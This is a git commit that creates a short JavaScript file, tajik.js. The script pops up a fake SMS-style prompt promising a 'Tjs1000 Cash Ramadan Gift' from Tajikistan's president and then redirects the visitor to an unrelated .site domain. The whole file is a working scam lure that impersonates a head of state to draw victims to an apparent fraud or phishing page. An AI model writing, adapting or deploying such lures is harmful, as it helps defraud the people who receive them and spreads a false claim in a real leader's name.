bae03d10f5610a47910760000a3b3eaf71950c39
newetijazz27 <newetijazz27@gmail.com>
2026-02-17 13:16:57 +0100

    Create tajik.js

---
+++ tajik.js
@@ -0,0 +1,5 @@
+var password = 'Tjs1000'
+password = prompt('SMS: Congratulations, your are eligible to Tjs1000 Cash Ramadan Gift From President Emomali Rahmon, click OK to activate now','Tjs1000');
+if (password != 'Tjs1000') {
+    location.href ='https://www.obxrgjob.site/tajik-ramadan';
+}
